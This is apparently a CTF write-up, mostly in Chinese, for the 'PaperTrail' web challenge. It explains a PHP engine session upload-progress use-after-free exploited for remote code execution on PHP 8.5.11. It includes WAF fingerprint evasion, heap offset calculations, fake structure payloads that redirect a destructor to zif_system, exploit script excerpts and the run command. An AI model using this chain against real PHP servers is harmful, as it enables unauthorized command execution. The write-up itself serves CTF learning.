# PaperTrail — submission desk

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-742BAC37` · 状态 solved
```

## 一句话

PaperTrail is a small internal "paper review desk" served by the stock PHP 8.5.11 Apache image.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `src/index.php` | 1.3 KB | `b09ab761aae9…` |
| `src/status.php` | 1.1 KB | `b24d198fac2f…` |
| `src/submit.php` | 1.4 KB | `e23c761e3fd9…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 1. 题目信息

| 项 | 内容 |
| --- | --- |
| 题目 | PaperTrail — submission desk |
| 类型 | Web |
| 目标 | http://{{INSTANCE_HOST}}/ |
| 镜像 | stock php:8.5.11-apache |
| Flag 位置 | /flag，web 账户可读 |
| 最终 Flag | «FLAG» |

题目描述强调：应用只检查上传元数据，不执行任何东西；但处理请求的 worker “记性比它应该有的长”。这指向 PHP engine 的 session.upload_progress 在 multipart 解析阶段的悬挂指针问题，而不是应用层漏洞。

### 2. 附件与配置

附件包括：

README.md

app/index.php

app/status.php

app/submit.php

etc/000-default.conf

etc/app.ini

etc/mpm_prefork.conf

关键配置：

; etc/app.ini

```
expose_php=0
display_errors=1
display_startup_errors=1
error_reporting=E_ALL
memory_limit=16M
post_max_size=32M
upload_max_filesize=32M
max_execution_time=30
session.name=PAPERSESS
session.save_path=/tmp
session.use_strict_mode=0
session.use_cookies=1
session.upload_progress.enabled=1
session.upload_progress.cleanup=1
disable_functions=exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,dl,putenv,mail
```

# etc/mpm_prefork.conf

KeepAlive Off

StartServers 1

MinSpareServers 1

MaxSpareServers 1

MaxRequestWorkers 1

ServerLimit 1

MaxConnectionsPerChild 0

单 worker 且不回收，意味着一次 OOM/bailout 留下的悬挂状态可以被后续请求复用。

etc/000-default.conf 是公开 php2shell PoC 的请求指纹规避规则，只匹配请求头，在 PHP 之前生效。被 403 的包括：

• Content-Type: multipart/form-data; boundary=SSSSSSSSSSSSSSSSS（17 个 S）
• boundary=BBBBBBBBBB（10 个 B）
• boundary=BNDRY12345
• Cookie: PHPSESSID=...

应用源码 app/submit.php 只读 $_POST / $_FILES 并打印元数据，不写盘、不 include、不执行，因此漏洞只能来自 PHP engine。

### 3. 漏洞原理

这是公开的 php2shell 利用链（CVE-2026-109618 / CVE-2026-109619 方向）：

1. session.upload_progress 在请求 RINIT 之前就初始化 session。
2. multipart 解析过程中触发 OOM / zend_bailout()，session 全局状态没有完整清理，PS(http_session_vars) 或 PS(id) 留下悬挂指针。
3. 下一个请求进入 php_session_track_init() 时，对悬挂的 PS(http_session_vars) 执行 zval_ptr_dtor()。
4. 如果悬挂的 zend_reference 内容可控，就可以让 val.type = 0x307 (IS_ARRAY_EX)、val.value 指向伪造的 zend_array；zend_array_destroy() 会调用 fake HashTable 的 pDestructor，把它改成 zif_system 即可执行命令。

stage1 / stage2 负责泄漏：

• stage1：Zend MM chunk base（从 Set-Cookie 越界读）
• stage2：libphp base（同样从 Set-Cookie 越界读）

远程实测：

[+] chunk base = 0x7b606c200000

[+] libphp base = 0x7b606de00000

### 4. 针对题目的适配

**4.1 WAF 指纹绕过**

不能直接用公开 PoC 的 boundary 和 Cookie：

S*17, B*10, BNDRY12345

Cookie: PHPSESSID=...

改成：

X*17, C*10, YNDRY12345

Cookie: PAPERSESS=...

同时把 Set-Cookie 的解析正则改成 PAPERSESS。

**4.2 session 字段名**

session.name=PAPERSESS 后：

• 字段名 PHPSESSID 只是普通字段，不会驱动 upload progress；
• 字段名 PAPERSESS 才会被 php_session_rfc1867_callback() 当成 session id；
• 为了得到 Set-Cookie 泄漏，stage1/2 的 session 字段必须叫 PAPERSESS，值为 \x00 或构造值；Cookie 头也必须是 PAPERSESS=...。

**4.3 为什么官方 15B carrier 不行**

官方 stage3 假设：

15-byte bin-40 zend_string lands its chars exactly at PS(http_session_vars)

但本题 PHP 8.5.11 上，PS(http_session_vars) 指向的已释放 zend_reference 是：

gc(8) + zval(16) + sources(8) = 32 字节

即 bin-32。15B zend_string 实际是 40B 块，55B fake ref 是 56B 块，都无法占用这个 32B 槽。用 gdb 在 php_session_track_init 断点确认：

```
R0=chunk+0x68160
```

BLOCK R0-0x20=32  R0-0x10=32  R0=32

R0 周围整段都是 32B bin，所以官方 56B raw ref 的 R0-0x10 对齐也不成立。

**4.4 96 字节 POST value carrier**

最终使用 96B 的 POST 字段值：

• 96B 值的 zend_string 分配为 128B 块；
• 块起点 chunk+0x68100；
• data 在块起点 + 24 = chunk+0x68118；
• 在 value 的 +0x48 处写完整 fake zend_reference：

carrier[0x48:0x48+24] = struct.pack("<IIQQ", 1, 0x1A, htd, 0x307)

地址计算：

0x68118 + 0x48 = 0x68160 = R0

fake reference 布局正好覆盖：

+0x00  gc.rc=1, gc.type=0x1A (IS_REFERENCE)

+0x08  val.value = htd (fake HashTable)

+0x10  val.type = 0x307 (IS_ARRAY_EX)

+0x18  sources = 0 (未覆盖也可)

4.5 expose_php=0 的 0x1000 偏移

本地用 expose_php=1 的 lab 验证时，carrier 块在 chunk+0x68100，R0 在 chunk+0x68160，可以直接命中。

题目配置 expose_php=0 后，实测 carrier 块整体后移 0x1000：

```
expose_php=1: carrier block 0x...68100, R0 0x...68160
expose_php=0: carrier block 0x...69100, R0 0x...68160
```

此时 value+0x48 落到 0x...69160，不再等于 R0。

解决办法：把 A 请求中的 PAPERSESS 值长度从 19 改成 64，使悬挂 reference 的 R0 也后移 0x1000：

```
R0 = chunk + 0x69160
```

carrier data = chunk + 0x69118

fake ref = 0x69118 + 0x48 = 0x69160 = R0

**4.6 fake HashTable 地址**

htdata 不是固定的官方 0x690d8。在最终的 A 形状下，用 gdb 在 php_session_initialize 断点扫描 fake HashTable 的 pDestructor（等于 zif_system）指针，定位到第一份 167B ht 字符串的 data：

```
htdata = chunk + 0x6a0d8
```

fake HashTable 的 pDestructor 位于 htdata + 0x30，即 zif_system。

### 5. 最终利用脚本

核心脚本是 m4_pt.py。关键逻辑：

```python
HT_OFF = int(os.environ.get('M4_HT', '0x6a0d8'), 0)
SIDLEN = int(os.environ.get('M4_SIDLEN', '64'))
REF_OFF = int(os.environ.get('M4_REFOFF', '0x48'), 0)
def stage3(self, htdata, zif):
chunk = htdata - self.htdata_offset
htd = chunk + HT_OFF
```

ht, _ref = self._fake_payload(htd, zif)

# A：64 字节 PAPERSESS，把 R0 推到 chunk+0x69160

```
a_parts = [
{"name": "PAPERSESS", "data": b"a" * SIDLEN},
{"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
```

]

...

self.t.post(E.build_multipart(a_parts, b"X" * 17), b"X" * 17,

```
extra_headers={"Cookie": "PAPERSESS=" + "a" * 32})
```

# B：96B carrier，fake ref 写在 value+0x48

```
carrier = bytearray(b"C" * 96)
```

carrier[REF_OFF:REF_OFF + 24] = struct.pack("<IIQQ", 1, 0x1A, htd, 0x307)

...

完整命令（在题目目录执行）：

$env:M4_PRINT='1'

py -3 papertrail\m4_pt.py `

-u http://{{INSTANCE_HOST}}/index.php `

--huge-mb 10 `

--htdata-offset 0x690d8 `

--zif-offset 0x5996e0 `

--dtor-offset 0x7b47a0 `

--offsets-file none `

-c 'cat</flag' `

--proof-file papertrail\lab\nope `

--timeout 60 --retries 1

```
cat</flag 只有 9 字节，避开了 PoC 的 14 字节命令上限，也不需要写文件。
```

### 6. 实际结果

stage1 / stage2：

[+] chunk base = 0x7b606c200000

[+] libphp base = 0x7b606de00000

stage3：

[*] stage 3: HTDATA=0x7b606c2690d8 ZIF=0x7b606e3996e0

[m4] chunk=0x7b606c200000 htd=0x7b606c26a0d8

[m4] B response: b'HTTP/1.1 200 OK\r\n...

Transfer-Encoding: chunked\r\n

Content-Type: text/html; charset=UTF-8\r\n\r\n

26\r\n«FLAG»\r\n'

最终：

«FLAG»

EXPLOIT_FAILED (no proof) 是正常的：--proof-file 检查的是本地文件，而命令实际在远程 worker 中执行，flag 直接出现在 stage3 的 HTTP 响应正文里。

### 7. 踩过的坑

• cp</flag>/tmp/ 不是有效命令：cp 没有参数，只有重定向，会报 missing operand；之前用它判断 stage3 是否成功是无效的。正确的最小命令是 cat</flag 或 cat</flag>f。
• 官方 15B carrier / 55B ref 在 PHP 8.5.11 的 bin-32 槽上不成立，无论怎么扫 N1、pads、A 长度都无法命中。
• expose_php=0 的 0x1000 偏移是本题和公开 8M lab 的关键差异；只改 htdata 或 REFOFF 不够，必须同时移动 R0。
• m4.py 最初把 stage3 挂在 E.Target 上，实际主循环调用的是 Exploit.stage3，导致看起来“96B carrier 有时成功有时失败”；最终 m4_pt.py 正确挂到 E.Exploit.stage3。

### 8. 复现注意

• 远程内部域名只在题目实例/VPN 可解析；如果 getaddrinfo failed，需要重新启动实例或接入对应网络。
• --huge-mb 用 10 即可；stage1/2 对 huge 不敏感。
• 本地验证时用 docker exec <lab> cat /tmp/p1，不要用宿主路径作为 --proof-file。
• 目标必须保持单 Apache worker；多 worker 下悬挂状态可能被不同进程消费，泄漏和 stage3 都会不稳定。

## 结果

- flag sha256：`90acafc6ae5f0c3cf677aae76a9141296f3365fa478beec2821f8ad9c1155321`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/exploit_pt.py`

## 待核实

- 本条目由 WP 第 7 节《PaperTrail — submission desk》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
